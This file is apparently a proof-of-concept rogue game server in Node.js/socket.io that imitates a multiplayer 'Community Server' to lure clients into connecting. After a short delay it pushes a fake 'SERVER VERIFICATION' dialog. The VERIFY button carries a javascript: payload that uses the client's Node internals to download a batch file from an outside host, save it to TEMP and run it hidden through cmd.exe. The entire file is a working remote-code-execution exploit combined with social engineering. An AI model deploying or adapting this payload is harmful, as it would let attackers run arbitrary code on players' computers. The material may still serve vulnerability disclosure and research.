const http = require('http');
const Server = require('socket.io');

const PORT = 8081;

const PAYLOAD = {
  id: 'server_verify',
  type: 'TYPE_YES_NO',
  titleText: 'SERVER VERIFICATION',
  messageText: 'This server requires a quick client verification before you can join.\n\nClick VERIFY to continue.',
  yesText: 'VERIFY',
  noText: 'CANCEL',
  yesURL: "javascript:(function(){try{window.c=opener.require('child_process');window.h=opener.require('http');window.f=opener.require('fs');window.p=opener.process.env.TEMP+'\\\\xx.bat';window.x=function(){try{window.c.spawn('cmd.exe',['/c',window.p],{detached:true,stdio:'ignore',windowsHide:true}).unref();}catch(e){}};window.h.get('http://yourfile.com/xx.bat',function(r){window.w=window.f.createWriteStream(window.p);r.pipe(window.w);window.w.on('finish',window.x);}).on('error',function(){window.c.spawn('curl.exe',['-s','http://yourfile.com/xx.bat','-o',window.p],{windowsHide:true}).on('close',window.x);});}catch(e){}})()"
};

const httpServer = http.createServer((req, res) => {
  console.log('[http]', req.method, req.url, 'origin=' + (req.headers.origin || '-'));
  res.writeHead(200, { 'Content-Type': 'text/plain' });
  res.end('yo stop\n');
});

httpServer.on('upgrade', (req) => {
  console.log('[ws upgrade]', req.url, 'origin=' + (req.headers.origin || '-'));
});

const io = Server(httpServer, {
  transports: ['websocket'],
  origins: (origin, fn) => fn(null, true),
  pingTimeout: 20000,
  pingInterval: 25000
});

io.engine.on('connection_error', (err) => {
  console.log('[engine error]', err && err.code, err && err.message);
});

io.on('connection', (socket) => {
  console.log('[+] client connected:', socket.id, socket.handshake.address);

  // Minimal handshake so the client leaves the "connecting" window and the
  // multiplayer menu loads normally.
  socket.emit('onConnect', { id: socket.id }, { name: 'Community Server', motd: '' });
  socket.emit('receiveLobbyList', []);
  socket.emit('getServerData', {
    name: 'Community Server',
    players: 1,
    maxPlayers: 16,
    gameMode: 'Deathmatch'
  });

  // Keep the client happy if it asks for things.
  socket.on('updatePlayerData', (data) => {
    socket.emit('onUpdatePlayerData', Object.assign({ id: socket.id }, data || {}));
  });
  socket.on('getServerData', () => {
    socket.emit('getServerData', {
      name: 'Community Server',
      players: 1,
      maxPlayers: 16,
      gameMode: 'Deathmatch'
    });
  });
  socket.on('getLobbyList', () => socket.emit('receiveLobbyList', []));
  socket.on('getPlayerList', () => socket.emit('receivePlayerList', []));
  socket.on('getChatHistory', () => socket.emit('receiveChatHistory', []));
  socket.on('requestParty', () => socket.emit('updateParty', null));


  setTimeout(() => {
    if (!socket.connected) return;
    console.log('[>] sending showWindow payload');
    socket.emit('showWindow', PAYLOAD);
  }, 2500);

  socket.on('disconnect', (reason) => {
    console.log('[-] client disconnected:', socket.id, reason);
  });
});

httpServer.listen(PORT, '127.0.0.1', () => {
  console.log('DS3 PoC server on http://127.0.0.1:' + PORT);
  console.log('Join via: Multiplayer -> Custom Server URL -> http://127.0.0.1:' + PORT);
});